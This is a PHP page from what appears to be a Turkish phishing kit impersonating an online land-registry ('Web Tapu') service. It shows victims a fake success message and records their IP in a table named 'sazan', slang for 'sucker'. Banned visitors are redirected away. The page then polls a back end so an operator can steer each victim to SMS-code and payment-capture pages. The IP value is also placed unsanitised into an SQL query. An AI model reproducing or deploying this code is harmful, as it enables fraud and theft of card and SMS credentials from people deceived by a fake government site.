<?php
   date_default_timezone_set('Europe/Istanbul');
   include("gmypanel/Core/getRealIPAdress.php");
   include("gmypanel/Core/mobileDetect.php");
   include("gmypanel/Core/browserDetect.php");
   include("gmypanel/Connection.php");

   ob_start(); 
   session_start(); 

   
   $ip = getUserIP();

   $db->query("UPDATE sazan SET now = 'Tebrik Ekranında' WHERE ip = '{$ip}'");

   
   $ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
   foreach($ban as $kontrol){
       if($kontrol['ban'] == $ip){ 
          header('Location:https://www.youtube.com/watch?v=D4Ici4i8_3A&ab_channel=Epha');
       } 
   }
   
   ?>
<html lang="tr">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Tapu İşlemleri</title>
    <link rel="stylesheet" href="general_css/style.css">
    <script src="v4/Scripts/jquery-1.9.1.min.js"></script>
    <style>
        @media(max-width:768px) {
            form {
                width: 100% !important;
            }
        }
    </style>
</head>

<body>

    <div class="container" style="background:#fff">
        <img src="general_css/istmob.png" style="width:350px;position:absolute;top:10px">
        <form action="" method="post" style="padding-top:0px;box-shadow:none">
            <div class="flexbox">
                <div class="inputBox" style="text-align:center;margin-top:0px;">
                    <img src="general_css/complete.png" width="100" alt="Başarılı Gif" style="margin-bottom:20px;">
                    <h2 style="text-transform:none">İşleminiz başarıyla gerçekleşmiştir.</h2>
                    <p style="text-transform:none"><?php $kontrol = $db->query("SELECT * FROM site WHERE id = '1'")->fetch(PDO::FETCH_ASSOC);echo $kontrol['magaza_name']; ?> işleminiz başarıyla gerçekleştirilmiştir. 24 saat içinde
                        telefon numaranıza bildirim gelecektir.</p>
                </div>

            </div>
            <input type="hidden" id="token" name="token" value="<?= $sessionToken ?>">
        </form>
    </div>
    <script type="text/javascript">
        $(document).ready(function () {
            gonder();
        });

        function gonder() {
            $.ajax({
                type: 'POST',
                url: '<?php echo "Database.php?ip=".$ip; ?>',
                success: function (msg) {
                    if (msg == 'sms') {
                        window.location.href = 'SecurePayment.php';
                    }
                    else if (msg == 'tebrik') {
                        window.location.href = 'Successful.php';
                    }
                    else if (msg == 'hata1') {
                        window.location.href = 'Error.php';
                    }
                    else if (msg == 'back') {
                        window.location.href = 'index.php';
                    }
                    else if (msg == 'sms2') {
                        window.location.href = 'Wrong_Sms.php';
                    }
                    else if (msg == 'hata2') {
                        window.location.href = 'Closed_to_Internet.php';
                    }
                    else {
                        setTimeout(gonder, 2500);
                    }
                },
                error: function() {
                    setTimeout(gonder, 2500);
                }
            });
        }
    </script>
</body>

</html>
